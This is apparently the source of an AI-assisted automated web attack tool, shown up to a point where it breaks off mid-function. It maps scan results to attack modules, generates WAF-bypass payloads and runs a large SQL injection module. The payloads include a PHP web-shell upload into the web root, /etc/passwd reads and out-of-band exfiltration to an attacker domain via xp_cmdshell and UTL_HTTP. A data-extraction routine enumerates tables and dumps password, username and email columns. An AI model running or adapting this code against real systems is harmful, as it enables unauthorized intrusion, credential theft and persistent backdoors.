import os
import subprocess
import configparser
import google.genai as genai
import anthropic
import time
from datetime import datetime
import threading
import queue
import socket # Added for HTTP Smuggling module
import requests # Added for SQLi module
import re # Added for SQLi module
import json # Added for SQLi module
from urllib.parse import quote_plus # Added for SQLi module

# Placeholder for detailed reporting
class Report:
    def __init__(self):
        self.findings = []

    def add_finding(self, finding):
        self.findings.append(finding)

    def generate_poc_code(self, finding):
        """Generates Python requests-based PoC code for a given finding."""
        if finding.get("poc_code"):
            return finding["poc_code"]
        return "# PoC code generation not implemented for this finding type yet."

    def generate_report(self, filename="penetration_test_report.md"):
        print(f"[+] Generating report: {filename}")
        report_content = "# Penetration Test Report\n\n"
        for finding in self.findings:
            report_content += f"## {finding.get('type', 'Unknown Vulnerability')}\n"
            report_content += f"- **Severity:** {finding.get('severity', 'N/A')}\n"
            report_content += f"- **Parameter:** {finding.get('parameter', 'N/A')}\n"
            report_content += f"- **Payload:** `{finding.get('payload', 'N/A')}`\n"
            if finding.get("db_type"):
                report_content += f"- **Database Type:** {finding['db_type']}\n"
            if finding.get("extracted_data"):
                report_content += f"- **Extracted Data:** {json.dumps(finding['extracted_data'], indent=2)}\n"
            if finding.get("response_snippet"):
                report_content += f"- **Response Snippet:**\n```\n{finding['response_snippet']}\n```\n"
            if finding.get("poc_code"):
                report_content += f"- **PoC Code:**\n```python\n{self.generate_poc_code(finding)}\n```\n\n"
            if finding.get("action_type"): # For attack logs
                report_content += f"- **AI Model:** {finding.get('ai_model', 'N/A')}\n"
                report_content += f"- **Action Type:** {finding.get('action_type', 'N/A')}\n"
                report_content += f"- **Action Details:** `{finding.get('action_details', 'N/A')}`\n"
                report_content += f"- **Output:**\n```\n{finding.get('output', 'N/A')}\n```\n"
                report_content += f"- **Timestamp:** {finding.get('timestamp', 'N/A')}\n"
        
        with open(filename, "w") as f:
            f.write(report_content)
        print(f"[+] Report saved to {filename}")

    def add_attack_log(self, step_number, ai_name, action_type, action_details, output):
        self.findings.append({
            "type": "Attack Log",
            "step": step_number,
            "ai_model": ai_name,
            "action_type": action_type, # "shell_command" or "internal_function_call"
            "action_details": action_details, # The command string or function call string
            "output": output, # The output from the command or function
            "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        })

# Placeholder for AI decision making and dynamic payload generation
# These functions will be expanded later as per the user's request.
def ai_analyze_scan_results(scan_results):
    """
    AI analyzes scan results to determine the most effective attack modules and payloads.
    This function parses Nmap, Nikto, and Nuclei scan results to identify technologies,
    open ports, and potential vulnerabilities, then suggests prioritized attack modules.
    """
    print("[AI] Analyzing scan results...")
    prioritized_attacks = []
    detected_technologies = []
    open_ports = []
    potential_vulnerabilities = []

    # --- Parse Nmap Results ---
    nmap_output = scan_results.get('nmap', '')
    if nmap_output:
        # Detect open ports
        for match in re.finditer(r"(\d+)/(tcp|udp)\s+open", nmap_output):
            port = match.group(1)
            protocol = match.group(2)
            open_ports.append(f"{port}/{protocol}")
        
        # Detect services/technologies
        if "Apache" in nmap_output:
            detected_technologies.append("Apache")
        if "nginx" in nmap_output:
            detected_technologies.append("nginx")
        if "Microsoft IIS" in nmap_output:
            detected_technologies.append("IIS")
        if "PHP" in nmap_output:
            detected_technologies.append("PHP")
        if "MySQL" in nmap_output:
            detected_technologies.append("MySQL")
        if "PostgreSQL" in nmap_output:
            detected_technologies.append("PostgreSQL")
        if "Microsoft SQL Server" in nmap_output:
            detected_technologies.append("MSSQL")
        if "Oracle" in nmap_output:
            detected_technologies.append("Oracle")
        if "Redis" in nmap_output:
            detected_technologies.append("Redis")
        if "SSH" in nmap_output:
            detected_technologies.append("SSH")
        if "FTP" in nmap_output:
            detected_technologies.append("FTP")
        if "SMTP" in nmap_output:
            detected_technologies.append("SMTP")
        if "Telnet" in nmap_output:
            detected_technologies.append("Telnet")

    # --- Parse Nikto Results ---
    nikto_output = scan_results.get('nikto', '')
    if nikto_output:
        if "XSS" in nikto_output or "Cross Site Scripting" in nikto_output:
            potential_vulnerabilities.append("XSS")
        if "SQL Injection" in nikto_output:
            potential_vulnerabilities.append("SQL Injection")
        if "File Inclusion" in nikto_output:
            potential_vulnerabilities.append("LFI/RFI")
        if "Remote Code Execution" in nikto_output:
            potential_vulnerabilities.append("RCE")
        if "Server-Side Request Forgery" in nikto_output:
            potential_vulnerabilities.append("SSRF")
        if "XML External Entity" in nikto_output:
            potential_vulnerabilities.append("XXE")
        if "Template Injection" in nikto_output:
            potential_vulnerabilities.append("SSTI")
        if "Login Form" in nikto_output:
            potential_vulnerabilities.append("Login Form")

    # --- Parse Nuclei Results ---
    nuclei_output = scan_results.get('nuclei', '')
    if nuclei_output:
        # Nuclei output is often structured, but for simplicity, we'll do keyword matching
        if "xss" in nuclei_output.lower():
            potential_vulnerabilities.append("XSS")
        if "sql-injection" in nuclei_output.lower():
            potential_vulnerabilities.append("SQL Injection")
        if "lfi" in nuclei_output.lower() or "rfi" in nuclei_output.lower():
            potential_vulnerabilities.append("LFI/RFI")
        if "ssrf" in nuclei_output.lower():
            potential_vulnerabilities.append("SSRF")
        if "xxe" in nuclei_output.lower():
            potential_vulnerabilities.append("XXE")
        if "ssti" in nuclei_output.lower():
            potential_vulnerabilities.append("SSTI")
        if "login" in nuclei_output.lower() or "auth" in nuclei_output.lower():
            potential_vulnerabilities.append("Login Form")

    # --- Prioritize Attacks based on findings ---

    # High priority for direct vulnerability findings
    if "SQL Injection" in potential_vulnerabilities:
        prioritized_attacks.append("perform_sqli_attack")
    if "XSS" in potential_vulnerabilities:
        prioritized_attacks.append("perform_xss_attack")
    if "LFI/RFI" in potential_vulnerabilities:
        prioritized_attacks.append("perform_lfi_rfi_attack")
    if "SSRF" in potential_vulnerabilities:
        prioritized_attacks.append("perform_ssrf_attack")
    if "XXE" in potential_vulnerabilities:
        prioritized_attacks.append("perform_xxe_attack")
    if "SSTI" in potential_vulnerabilities:
        prioritized_attacks.append("perform_ssti_attack")
    if "Login Form" in potential_vulnerabilities:
        prioritized_attacks.append("perform_brute_force_login")

    # NEW: Prioritize IDOR if numeric IDs are found in URLs
    if any(re.search(r'[?&](id|user_id|item_id|file_id|page_id)=\d+', url) for url in scan_results.get('spider_urls', [])):
        prioritized_attacks.append("perform_idor_attack")

    # NEW: Prioritize HTTP Smuggling if a proxy/load balancer is likely
    if any(tech in detected_technologies for tech in ["Apache", "nginx", "IIS"]):
        prioritized_attacks.append("perform_http_smuggling_attack")

    # Add attacks based on detected technologies if no direct vulns found yet
    if not prioritized_attacks:
        if "PHP" in detected_technologies:
            prioritized_attacks.extend(["perform_lfi_rfi_attack", "perform_ssti_attack"]) # PHP often vulnerable to these
        if "MySQL" in detected_technologies or "PostgreSQL" in detected_technologies or "MSSQL" in detected_technologies or "Oracle" in detected_technologies:
            prioritized_attacks.append("perform_sqli_attack")
        if "Apache" in detected_technologies or "nginx" in detected_technologies or "IIS" in detected_technologies:
            prioritized_attacks.extend(["perform_xss_attack", "perform_ssrf_attack"]) # Web servers are common targets

    # Ensure unique attacks and a default if nothing specific is found
    prioritized_attacks = list(dict.fromkeys(prioritized_attacks)) # Remove duplicates while preserving order
    if not prioritized_attacks:
        prioritized_attacks.extend(["perform_sqli_attack", "perform_xss_attack"]) # Default to common web attacks

    print(f"[AI] Prioritized attacks: {prioritized_attacks}")
    return {"prioritized_attacks": prioritized_attacks, "detected_technologies": detected_technologies, "open_ports": open_ports, "potential_vulnerabilities": potential_vulnerabilities}

def ai_generate_dynamic_payloads(server_response, vulnerability_type):
    """
    AI generates custom WAF bypass payloads based on server responses.
    This function analyzes server responses to identify WAFs or other security mechanisms
    and suggests modified payloads to bypass them.
    """
    print(f"[AI] Generating dynamic payloads for {vulnerability_type}...")
    dynamic_payloads = []

    # Common WAF/security indicators in response
    waf_indicators = [
        "Mod_Security", "mod_security", "WAF", "Web Application Firewall",
        "Cloudflare", "Sucuri", "Incapsula", "Akamai", "Barracuda",
        "blocked", "denied", "access forbidden", "request blocked"
    ]

    response_text = server_response.get('text', '').lower()
    response_headers = {k.lower(): v.lower() for k, v in server_response.get('headers', {}).items()}
    status_code = server_response.get('status_code')

    # Check for WAF indicators
    is_waf_present = any(indicator in response_text for indicator in waf_indicators) or \
                     any(indicator in str(response_headers) for indicator in waf_indicators) or \
                     "x-waf-info" in response_headers or "x-sucuri-id" in response_headers

    if is_waf_present:
        print("[AI] WAF/Security mechanism detected. Attempting bypass techniques.")
        if vulnerability_type == "SQL Injection":
            dynamic_payloads.extend([
                # Encoding variations
                "1%27%20OR%201%3d1%20--", # URL encoded
                "1%2527%2520OR%25201%253d1%2520--", # Double URL encoded
                "1' /**/OR/**/1=1/**/--", # Comment obfuscation
                "1' UNION SELECT /*!*/ 1,2,3 --", # MySQL specific comment
                "1' AND '1'='1' AND '1'='1", # Tautology
                "1' AND 1=1 AND 'a'='a", # Tautology with string
                "1' AND (SELECT 1 FROM (SELECT SLEEP(5))A) AND '1'='1", # Time-based with subquery
            ])
        elif vulnerability_type == "XSS":
            dynamic_payloads.extend([
                # Encoding variations
                "%3cscript%3ealert(1)%3c/script%3e", # URL encoded
                "&#x3c;script&#x3e;alert(1)&#x3c;/script&#x3e;", # HTML entity encoded
                "<img src=x onerror=&#x61;lert(1)>", # Hex encoded char
                
                # Tag/attribute obfuscation
                "<sCrIpT>alert(1)</sCrIpT>", # Case variation
                "<img/src=x/onerror=alert(1)>", # Slash obfuscation
                "<svg onload=alert(1)>", # Different tag
                
                # Event handler bypasses
                "<body onpageshow=alert(1)>",
                "<details open ontoggle=alert(1)>",
            ])
        elif vulnerability_type == "LFI/RFI":
            dynamic_payloads.extend([
                "....//....//....//....//etc/passwd", # Double dot-slash
                "%252e%252e%252f%252e%252e%252fetc%252fpasswd", # Double URL encoded
                "php://filter/convert.base64-encode/resource=index.php", # PHP filter
                "file:///etc/passwd%00.jpg", # Null byte
            ])
        # Add more vulnerability types and bypass techniques

    # If no WAF, or specific bypasses for status codes/errors
    if status_code == 403: # Forbidden
        print("[AI] Received 403 Forbidden. Trying alternative methods.")
        if vulnerability_type == "SQL Injection":
            dynamic_payloads.extend([
                "1' OR 1=1 LIMIT 1 --", # Limit clause
                "1' AND '0'='0", # Different tautology
            ])
        # Add more status code specific bypasses

    if "error" in response_text or "exception" in response_text:
        print("[AI] Error message detected. Trying error-based payloads.")
        # This could be a trigger for more specific error-based payloads if not already tried.
        # For now, just a print.

    # Ensure unique payloads
    dynamic_payloads = list(dict.fromkeys(dynamic_payloads))
    
    if not dynamic_payloads:
        print("[AI] No specific dynamic payloads generated. Returning default.")
        # Fallback to some generic bypasses if nothing specific was generated
        if vulnerability_type == "SQL Injection":
            dynamic_payloads.append("1' OR '1'='1' --")
        elif vulnerability_type == "XSS":
            dynamic_payloads.append("<script>alert('XSS')</script>")

    return dynamic_payloads

# --- SQL Injection Module ---

def perform_sqli_attack(target_url, method="GET", data=None, headers=None, cookies=None, timeout=10, verify_ssl=True):
    """
    Performs various SQL Injection attacks on the target URL.

    Args:
        target_url (str): The URL to attack.
        method (str): HTTP method (GET or POST).
        data (dict): POST data.
        headers (dict): HTTP headers.
        cookies (dict): HTTP cookies.
        timeout (int): Request timeout in seconds.
        verify_ssl (bool): Whether to verify SSL certificates.

    Returns:
        list: A list of dictionaries, each representing a detected vulnerability or information.
    """
    print(f"[+] Starting SQL Injection scan for: {target_url}")
    vulnerabilities = []

    # Common SQLi payloads (Error-based, Blind, Time-based)
    sqli_payloads = [
        # Error-based SQLi
        "' OR 1=1 --",
        "\" OR 1=1 --",
        "1' OR '1'='1",
        "1\" OR \"1\"=\"1",
        "1' AND 1=CAST( (SELECT @@version) AS INT) --", # MySQL/MSSQL version
        "1' AND 1=CAST( (SELECT version()) AS INT) --", # PostgreSQL version
        "1' AND 1=CAST( (SELECT user()) AS INT) --", # MySQL/PostgreSQL user
        "1' AND 1=CAST( (SELECT current_database()) AS INT) --", # PostgreSQL database
        "1' AND 1=CAST( (SELECT db_name()) AS INT) --", # MSSQL database
        "1' AND 1=CAST( (SELECT @@hostname) AS INT) --", # MSSQL hostname
        "1' AND 1=CAST( (SELECT host_name()) AS INT) --", # PostgreSQL hostname
        "1' AND 1=CAST( (SELECT table_name FROM information_schema.tables WHERE table_schema = database() LIMIT 0,1) AS INT) --", # MySQL table name
        "1' AND 1=CAST( (SELECT table_name FROM information_schema.tables WHERE table_catalog = current_database() LIMIT 0,1) AS INT) --", # PostgreSQL table name
        "1' AND 1=CAST( (SELECT name FROM master..sysdatabases WHERE name NOT IN ('master', 'tempdb', 'model', 'msdb') LIMIT 0,1) AS INT) --", # MSSQL database names
        "1' AND 1=CAST( (SELECT column_name FROM information_schema.columns WHERE table_name = 'users' LIMIT 0,1) AS INT) --", # MySQL column name
        "1' AND 1=CAST( (SELECT column_name FROM information_schema.columns WHERE table_name = 'users' AND table_catalog = current_database() LIMIT 0,1) AS INT) --", # PostgreSQL column name
        "1' AND 1=CAST( (SELECT TOP 1 column_name FROM information_schema.columns WHERE table_name = 'users') AS INT) --", # MSSQL column name
        "1' AND 1=CAST( (SELECT username FROM users LIMIT 0,1) AS INT) --", # MySQL/PostgreSQL data extraction
        "1' AND 1=CAST( (SELECT TOP 1 username FROM users) AS INT) --", # MSSQL data extraction

        # Time-based Blind SQLi (MySQL/PostgreSQL)
        "1' AND SLEEP(5) --",
        "1' UNION SELECT SLEEP(5) --",
        "1' OR IF(1=1,SLEEP(5),0) --",
        "1' AND (SELECT 5 FROM PG_SLEEP(5)) --", # PostgreSQL

        # Boolean-based Blind SQLi
        "1' AND 1=2 --", # Should return false
        "1' AND 1=1 --", # Should return true

        # WAF Bypass techniques
        "1' /*!UNION*/ SELECT 1,2,3 --", # MySQL inline comment bypass
        "1' UNION /*!50000SELECT*/ 1,2,3 --", # MySQL versioned comment bypass
        "1' UNI%0bON SELE%0bCT 1,2,3 --", # Whitespace bypass
        "1' UNION SELECT '<?php phpinfo(); ?>' INTO OUTFILE '/var/www/html/info.php' --", # File write (example)
        "1' UNION SELECT LOAD_FILE('/etc/passwd') --", # File read (example)
        "1' AND (SELECT COUNT(*) FROM information_schema.tables) > 0 --", # Example for boolean-based
        "1' AND (SELECT SUBSTRING(version(),1,1)) = '5' --", # Example for boolean-based version check
        # --- Error-Based SQLi (Expanded) ---
        "1' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(0x7e, (SELECT @@version), 0x7e, FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--", # MySQL (double query)
        "1' AND EXTRACTVALUE(1,CONCAT(0x5c, (SELECT @@version)))--", # MySQL (XML based)
        "1' AND 1=CONVERT(INT, (SELECT @@version))--", # MSSQL error
        "1' AND 1=(SELECT TO_NUMBER(user) FROM DUAL)--", # Oracle error
        "1' AND 1=(SELECT CAST(current_setting('server_version') AS int))--", # PostgreSQL (current_setting)
        "1' AND 1=CONVERT(int, (SELECT @@version_compile_os))--", # MSSQL OS version
        "1' AND 1=CAST(char(113)+char(119)+char(98)+char(106)+char(113)+(select user)+char(113)+char(118)+char(122)+char(113)+char(113) as NVARCHAR(4000))--", # MSSQL error-based string concat
        "1' AND 1=CAST((SELECT substring(@@version,1,1)) AS INT)--", # MySQL error-based version check
        "1' AND 1=CAST((SELECT substring(user(),1,1)) AS INT)--", # MySQL error-based user check
        "1' AND 1=CAST((SELECT substring(database(),1,1)) AS INT)--", # MySQL error-based database check

        # --- Time-Based Blind SQLi (Expanded) ---
        "' AND BENCHMARK(5000000,MD5(1))--", # MySQL CPU intensive
        "' OR IF(1=1,SLEEP(5),0)", # MySQL conditional sleep
        "' WAITFOR DELAY '0:0:5'--", # MSSQL
        "'; WAITFOR DELAY '0:0:5'--", # MSSQL with semicolon
        "' AND DBMS_LOCK.SLEEP(5)--", # Oracle
        "' AND DBMS_PIPE.RECEIVE_MESSAGE('a',5)--", # Oracle
        "1' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a) AND '1'='1--", # MySQL subquery sleep
        "1' AND 1=(SELECT 1 FROM PG_SLEEP(5))--", # PostgreSQL variation
        "1' AND 1=(SELECT 1 FROM (SELECT(SLEEP(5)))a) AND '1'='1--", # Generic subquery sleep

        # --- Boolean-Based Blind SQLi (Expanded) ---
        "1' AND 'a'='a", # Tautology
        "1' AND 'a'='b", # Contradiction
        "1' AND SUBSTR(VERSION(),1,1)='5'--", # MySQL version check
        "1' AND (SELECT ASCII(SUBSTRING((SELECT database()),1,1)))>100--", # MySQL char code check
        "1' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database() AND SUBSTRING(table_name,1,1) > 'a')--", # MySQL table enumeration

        # --- UNION-Based (Expanded) ---
        "UNION SELECT 1,2,3--", # Common column count
        "UNION SELECT 1,version(),database()--", # MySQL/PostgreSQL info
        "UNION SELECT 1,user(),@@hostname--", # MySQL/PostgreSQL info
        "UNION SELECT 1,table_name,column_name FROM information_schema.columns--", # MySQL/PostgreSQL table/column enum
        "UNION SELECT 1,load_file('/etc/passwd'),3--", # MySQL file read
        "UNION SELECT 1,'<?php system($_GET[\"cmd\"]); ?>',3 INTO OUTFILE '/var/www/html/shell.php'--", # MySQL shell upload

        # --- WAF Bypasses & Obfuscation (Expanded) ---
        "1' AND 1=1 AND '%'='%'", # Tautology with comment
        "1' OR TRUE --", # Boolean true
        "1' or 0=0--", # Boolean true
        "1' and (select * from (select sleep(0))a)--", # No-op sleep for baseline
        "1' OR '1'='1'#", # Hash comment
        "1' OR '1'='1'/*", # Multi-line comment
        "1' OR '1'='1'-- ", # Double dash comment with space

        # --- Out-of-Band (OOB) SQLi (New) ---
        "1' AND LOAD_FILE(CONCAT('\\\\',(SELECT HEX(SUBSTRING(@@version,1,10))),'.{oob_domain}\\test.txt'))--", # MySQL OOB DNS
        "1' AND master..xp_cmdshell('nslookup (SELECT @@version).{oob_domain}')--", # MSSQL OOB DNS
        "1' AND UTL_HTTP.REQUEST('http://{oob_domain}/'||(SELECT user FROM DUAL))--", # Oracle OOB HTTP
        "1' AND (SELECT pg_send_query(pg_connect('host={oob_domain} port=80 dbname=http query=(SELECT version())')) IS NOT NULL)--", # PostgreSQL OOB HTTP (Conceptual)
        "1' AND (SELECT utl_inaddr.get_host_address('{oob_domain}')) IS NOT NULL--" # Oracle OOB DNS
    ]
    error_patterns = {
        "MySQL": r"SQL syntax|MySQL error|Warning: mysql_|You have an error in your SQL syntax",
        "PostgreSQL": r"PostgreSQL error|syntax error at or near|PG::SyntaxError",
        "MSSQL": r"Microsoft OLE DB Provider for SQL Server error|SQL Server|Unclosed quotation mark",
        "Oracle": r"ORA-\d{5}|Oracle error",
        "Generic": r"SQLSTATE|database error|syntax error"
    }

    # Function to send request and check for errors/time delays
    def send_and_check(payload, param_name, original_response_time):
        current_data = data.copy() if data else {}
        current_headers = headers.copy() if headers else {}
        current_cookies = cookies.copy() if cookies else {}

        if method == "GET":
            test_url = f"{target_url}?{param_name}={quote_plus(payload)}"
            start_time = time.time()
            try:
                response = requests.get(test_url, headers=current_headers, cookies=current_cookies, timeout=timeout, verify=verify_ssl)
                end_time = time.time()
                response_time = end_time - start_time
                return response, response_time
            except requests.exceptions.RequestException as e:
                print(f"[-] Request failed: {e}")
                return None, 0
        elif method == "POST":
            current_data[param_name] = payload
            start_time = time.time()
            try:
                response = requests.post(target_url, data=current_data, headers=current_headers, cookies=current_cookies, timeout=timeout, verify=verify_ssl)
                end_time = time.time()
                response_time = end_time - start_time
                return response, response_time
            except requests.exceptions.RequestException as e:
                print(f"[-] Request failed: {e}")
                return None, 0
        return None, 0

    # Identify injectable parameters (simplified for now, assumes parameters are known or discovered elsewhere)
    # For a real tool, this would involve parsing forms, URLs, JSON bodies etc.
    # For this example, let's assume a single parameter 'id' for demonstration.
    # In a real scenario, ai_analyze_scan_results would help identify these.
    parameters_to_test = ['id'] # Placeholder, should be dynamically discovered

    for param_name in parameters_to_test:
        print(f"[*] Testing parameter: {param_name}")

        # Get baseline response time
        baseline_payload = "1"
        baseline_response, original_response_time = send_and_check(baseline_payload, param_name, 0)
        if baseline_response is None:
            continue

        for payload in sqli_payloads:
            print(f"    [>] Trying payload: {payload[:50]}...") # Truncate long payloads for display
            response, response_time = send_and_check(payload, param_name, original_response_time)

            if response is None:
                continue

            # Check for Error-based SQLi
            for db_type, pattern in error_patterns.items():
                if re.search(pattern, response.text, re.IGNORECASE):
                    vulnerabilities.append({
                        "type": "SQL Injection (Error-based)",
                        "severity": "High",
                        "parameter": param_name,
                        "payload": payload,
                        "response_snippet": response.text[:500], # Snippet of the response
                        "db_type": db_type,
                        "poc_code": f"import requests\nrequests.request(method='{method}', url='{target_url}', {{'data=' + str(data) if data else ''}}, {{'headers=' + str(headers) if headers else ''}}, {{'cookies=' + str(cookies) if cookies else ''}}, timeout={{timeout}}, verify={{verify_ssl}})" # Placeholder, needs actual PoC generation
                    })
                    print(f"        [!!!] SQL Injection (Error-based) detected in {param_name} ({db_type})!")
                    # Attempt data extraction if error-based is found
                    extracted_data = extract_sqli_data(target_url, method, data, headers, cookies, timeout, verify_ssl, param_name, db_type, send_and_check)
                    if extracted_data:
                        vulnerabilities[-1]["extracted_data"] = extracted_data
                        print(f"            [+] Extracted data: {extracted_data}")
                    break # Move to next payload if error found

            # Check for Time-based Blind SQLi
            if "SLEEP(5)" in payload or "PG_SLEEP(5)" in payload:
                if response_time >= original_response_time + 4: # Check for significant delay
                    vulnerabilities.append({
                        "type": "SQL Injection (Time-based Blind)",
                        "severity": "High",
                        "parameter": param_name,
                        "payload": payload,
                        "response_time": response_time,
                        "original_response_time": original_response_time,
                        "poc_code": f"import requests\nrequests.request(method='{method}', url='{target_url}', {{'data=' + str(data) if data else ''}}, {{'headers=' + str(headers) if headers else ''}}, {{'cookies=' + str(cookies) if cookies else ''}}, timeout={{timeout}}, verify={{verify_ssl}})" # Placeholder
                    })
                    print(f"        [!!!] SQL Injection (Time-based Blind) detected in {param_name}!")

            # Check for Boolean-based Blind SQLi (requires more sophisticated logic, e.g., comparing content)
            # This is a placeholder for future expansion.
            if "AND 1=2" in payload or "AND 1=1" in payload:
                # For full boolean-based detection, we'd need to compare responses for true/false conditions.
                # This would involve sending a true condition and a false condition and comparing the content/length.
                pass # Placeholder for now

    print(f"[+] SQL Injection scan completed for: {target_url}")
    return vulnerabilities

def extract_sqli_data(target_url, method, data, headers, cookies, timeout, verify_ssl, param_name, db_type, send_and_check_func):
    """
    Attempts to extract data using SQL Injection with enhanced techniques.
    """
    extracted_info = {}
    
    # 1. Determine number of columns
    num_columns = 0
    for i in range(1, 20): # Try up to 20 columns
        test_payload = f"1' ORDER BY {i} --"
        response, _ = send_and_check_func(test_payload, param_name, 0)
        if response and "Unknown column" not in response.text and "order clause" not in response.text.lower():
            num_columns = i
        else:
            break
    
    if num_columns == 0:
        print(f"        [INFO] Could not determine number of columns for UNION-based attack.")
        # Fallback to a common number if column count cannot be determined
        num_columns = 3 # Default to 3 for union select examples if no specific count found

    print(f"        [INFO] Determined {num_columns} columns for UNION-based attack.")

    # 2. Identify string-compatible columns for UNION SELECT
    string_columns = []
    for i in range(1, num_columns + 1):
        union_payload_parts = ["NULL"] * num_columns
        union_payload_parts[i-1] = "'SQLiTEST'"
        payload = f"1' UNION SELECT {','.join(union_payload_parts)} --"
        response, _ = send_and_check_func(payload, param_name, 0)
        if response and "SQLiTEST" in response.text:
            string_columns.append(i)
    
    if not string_columns:
        print(f"        [INFO] No string-compatible columns found for UNION-based data extraction.")
        # If no string columns, try to use the first column for basic info extraction
        if num_columns > 0:
            string_columns.append(1) # Fallback to first column

    print(f"        [INFO] String-compatible columns: {string_columns}")

    # 3. Extract basic DB info (version, user, database, hostname)
    info_payload_templates = {
        "version": {"MySQL": "version()", "PostgreSQL": "version()", "MSSQL": "@@version", "Oracle": "version"},
        "user": {"MySQL": "user()", "PostgreSQL": "user", "MSSQL": "user_name()", "Oracle": "user"},
        "database": {"MySQL": "database()", "PostgreSQL": "current_database()", "MSSQL": "db_name()", "Oracle": "sys_context('USERENV','DB_NAME')"},
        "hostname": {"MySQL": "@@hostname", "PostgreSQL": "inet_server_addr()", "MSSQL": "host_name()", "Oracle": "utl_inaddr.get_host_name"}
    }

    for info_name, db_funcs in info_payload_templates.items():
        db_func = db_funcs.get(db_type, db_funcs.get("MySQL")) # Default to MySQL if specific not found
        if not db_func: continue

        for col_idx in string_columns:
            union_payload_parts = ["NULL"] * num_columns
            union_payload_parts[col_idx-1] = db_func
            payload = f"1' UNION SELECT {','.join(union_payload_parts)} --"
            response, _ = send_and_check_func(payload, param_name, 0)
            if response and response.status_code == 200:
                # Attempt to extract the value from the response, looking for common patterns
                match = re.search(r'(\b\d+\.\d+\.\d+\b|\b\w+@[\w\.]+\b|\b[\w\d\._-]+\b)', response.text, re.IGNORECASE)
                if match:
                    extracted_info[info_name] = match.group(0)
                    print(f"            [+] Extracted {info_name}: {extracted_info[info_name]}")
                    break # Move to next info_name

    # 4. Table and Column Enumeration (for MySQL/PostgreSQL/MSSQL)
    if db_type in ["MySQL", "PostgreSQL"]:
        print(f"        [INFO] Attempting to enumerate tables and columns for {db_type}...")
        for col_idx in string_columns:
            # Enumerate tables
            table_payload = f"1' UNION SELECT {','.join(['NULL']*(col_idx-1) + ['group_concat(table_name)'] + ['NULL']*(num_columns-col_idx))} FROM information_schema.tables WHERE table_schema=database() --"
            response, _ = send_and_check_func(table_payload, param_name, 0)
            if response and response.status_code == 200:
                match = re.search(r'(\b\w+(?:,\w+)*\b)', response.text)
                if match:
                    tables = match.group(0).split(',')
                    extracted_info["tables"] = tables
                    print(f"            [+] Extracted tables: {tables}")

                    # Enumerate columns for a few interesting tables (e.g., 'users', 'admin')
                    for table in tables:
                        if "user" in table.lower() or "admin" in table.lower():
                            column_payload = f"1' UNION SELECT {','.join(['NULL']*(col_idx-1) + ['group_concat(column_name)'] + ['NULL']*(num_columns-col_idx))} FROM information_schema.columns WHERE table_schema=database() AND table_name='{table}' --"
                            response_cols, _ = send_and_check_func(column_payload, param_name, 0)
                            if response_cols and response_cols.status_code == 200:
                                match_cols = re.search(r'(\b\w+(?:,\w+)*\b)', response_cols.text)
                                if match_cols:
                                    columns = match_cols.group(0).split(',')
                                    extracted_info[f"columns_{table}"] = columns
                                    print(f"            [+] Extracted columns for {table}: {columns}")

                                    # Attempt to dump data from sensitive columns
                                    sensitive_cols_in_table = [c for c in columns if "pass" in c.lower() or "user" in c.lower() or "email" in c.lower()]
                                    if sensitive_cols_in_table:
                                        dump_cols = ", ".join(sensitive_cols_in_table)
                                        dump_payload = f"1' UNION SELECT {','.join(['NULL']*(col_idx-1) + [f'group_concat({dump_cols})'] + ['NULL']*(num_columns-col_idx))} FROM {table} --"
                                        response_dump, _ = send_and_check_func(dump_payload, param_name, 0)
                                        if response_dump and response_dump.status_code == 200:
                                            match_dump = re.search(r'(\b\w+(?:,\w+)*\b)', response_dump.text)
                                            if match_dump:
                                                dumped_data = match_dump.group(0)
                                                extracted_info[f"data_{table}"] = dumped_data
                                                print(f"            [CRITICAL] Dumped data from {table}: {dumped_data[:100]}...")
                                                break # Stop after first sensitive data dump

    elif db_type == "MSSQL":
        print(f"        [INFO] Attempting to enumerate tables and columns for MSSQL...")
        for col_idx in string_columns:
            # Enumerate tables
            table_payload = f"1' UNION SELECT {','.join(['NULL']*(col_idx-1) + ['(SELECT TOP 1 name FROM sys.tables WHERE is_ms_shipped = 0 AND name NOT IN (SELECT name FROM sys.tables WHERE is_ms_shipped = 0 ORDER BY name OFFSET (N) ROWS FETCH NEXT 1 ROW ONLY))'] + ['NULL']*(num_columns-col_idx))} --"
            # This requires iterating N for each table, which is complex for a single payload.
            # For simplicity, we'll try to get a few common tables directly.
            common_mssql_tables = ["users", "admins", "employees"]
            for table in common_mssql_tables:
                test_table_payload = f"1' AND EXISTS(SELECT 1 FROM sys.tables WHERE name='{table}') --"
                response_exists, _ = send_and_check_func(test_table_payload, param_name, 0)
                if response_exists and "exists" in response_exists.text.lower(): # Heuristic for existence
                    extracted_info["tables"] = extracted_info.get("tables", []) + [table]
                    print(f"            [+] Found MSSQL table: {table}")
                    # Enumerate columns for this table
                    column_payload = f"1' UNION SELECT {','.join(['NULL']*(col_idx-1) + [f'(SELECT TOP 1 name FROM sys.columns WHERE object_id = OBJECT_ID(''{table}'') AND name NOT IN (SELECT name FROM sys.columns WHERE object_id = OBJECT_ID(''{table}'') ORDER BY name OFFSET (N) ROWS FETCH NEXT 1 ROW ONLY))'] + ['NULL']*(num_columns-col_idx))} --"
                    # Similar complexity for columns, simplified for now
                    common_mssql_columns = ["username", "password", "email"]
                    for col in common_mssql_columns:
                        test_col_payload = f"1' AND EXISTS(SELECT 1 FROM sys.columns WHERE object_id = OBJECT_ID('{table}') AND name='{col}') --"
                        response_col_exists, _ = send_and_check_func(test_col_payload, param_name, 0)
                        if response_col_exists and "exists" in response_col_exists.text.lower():
                            extracted_info[f"columns_{table}"] = extracted_info.get(f"columns_{table}", []) + [col]
                            print(f"            [+] Found MSSQL column: {table}.{col}")
                            # Attempt to dump data
                            dump_payload = f"1' UNION SELECT {','.join(['NULL']*(col_idx-1) + [f'(SELECT TOP 1 {col} FROM {table})'] + ['NULL']*(num_columns-col_idx))} --"
                            response_dump, _ = send_and_check_func(dump_payload, param_name, 0)
                            if response_dump and response_dump.status_code == 200:
                                match_dump = re.search(r'(\b\w+(?:,\w+)*\b)', response_dump.text)
                                if match_dump:
                                    dumped_data = match_dump.group(0)
                                    extracted_info[f"data_{table}_{col}"] = dumped_data
                                    print(f"            [CRITICAL] Dumped data from {table}.{col}: {dumped_data[:100]}...")
                                    break # Stop after first sensitive data dump

    # 5. File Read/Write (MySQL specific, using LOAD_FILE and INTO OUTFILE)
    if db_type == "MySQL":
